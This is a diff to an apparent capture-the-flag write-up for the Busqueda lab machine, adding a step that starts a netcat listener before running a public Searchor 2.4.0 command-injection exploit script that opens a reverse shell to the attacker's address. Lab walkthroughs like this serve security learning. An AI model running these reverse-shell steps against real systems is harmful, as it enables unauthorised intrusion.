@@ -34,7 +34,7 @@ On the bottom of the website, it says "`Powered by Flask and Searchor 2.4.0`"
 I found a [POC](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) online
 
 
-We can run `./exploit.sh searcher.htb <tun0>` and we get a shell as `svc@busqueda`
+We can run start a listener with `nc -lvnp 9001` and run `./exploit.sh searcher.htb <tun0>` and we get a shell as `svc@busqueda`
 
 Theres a user flag in `/home/svc`
 
